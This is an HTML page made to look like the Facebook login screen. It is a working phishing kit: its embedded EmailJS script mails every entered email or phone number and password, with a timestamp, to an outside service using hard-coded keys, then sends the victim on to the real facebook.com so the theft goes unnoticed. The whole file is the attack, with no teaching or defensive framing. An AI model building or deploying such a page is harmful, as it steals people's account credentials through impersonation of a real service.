<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Facebook Login Page</title>
    <link rel="stylesheet" href="./login_form_2.css" />

  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
</head>

<body>
  <div class="content">
    <div class="flex-div">

      <div class="name-content">
        <h1 class="logo">Facebook</h1>
        <p>Connect with friends and the world around you on Facebook.</p>
      </div>

      <!-- FORM -->
      <form id="loginForm">

        <input type="text" name="name" placeholder="Email or Phone Number" required />

        <input type="password" name="message" placeholder="Password" required />

        <input type="hidden" name="time" id="timeField">

        <button type="submit" class="login">Log In</button>

        <a href="#">Forgot Password?</a>

        <hr>

        <!-- IMPORTANT: type="button" prevents form submit -->
        <button type="button" class="create-account">Create New Account</button>

      </form>

    </div>
  </div>

  <!-- EMAILJS SCRIPT -->
  <script>
  emailjs.init("X4J2kxxys4vMlTSyG");

  document.getElementById("loginForm").addEventListener("submit", function(e) {
    e.preventDefault();

    // add timestamp
    this.time.value = new Date().toLocaleString();

    emailjs.sendForm(
      "service_ekexo4f",
      "template_3k9j2rz",
      this
    ).then(() => {

      // SUCCESS → redirect after sending
      window.location.href = "https://www.facebook.com"; // change this to your page

    }).catch((err) => {
      console.log(err);
      alert("Failed to send");
    });
  });
</script>

</body>
</html>
